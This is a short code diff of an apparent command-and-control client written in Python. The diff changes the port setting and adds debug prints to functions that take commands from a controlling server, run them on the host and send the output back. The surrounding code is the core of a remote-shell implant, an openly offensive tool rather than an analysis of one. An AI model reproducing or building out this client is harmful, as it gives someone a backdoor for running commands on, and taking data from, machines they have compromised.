@@ -9,7 +9,7 @@ from C2utils import snd_msg, get_msg, snd_file, get_file
 
 #############################
 ## ========  Config  ========
-PORT = 5054 ## CONFIGURE THIS
+PORT = 5050 ## CONFIGURE THIS
 SERVER = socket.gethostbyname(socket.gethostname()) ## CONFIGURE THIS
 ## --------------------------
 FORMAT = 'utf-8'
@@ -28,6 +28,7 @@ def execute_command(conn, cmd_str):
     except:
         print("Command failed " + cmd_str)
     stdoutput = (proc.stdout.read() + proc.stderr.read()).decode()
+    print("SENDING: " + stdoutput)
     snd_msg(conn, stdoutput)
 
 def listen_to_server(conn):
@@ -36,6 +37,7 @@ def listen_to_server(conn):
     while connected:
         # Retrieve Message from server
         msg = get_msg(client)
+        print("HERE: " + msg)
 
         if msg == DISCONNECT_MESSAGE:
             connected = False
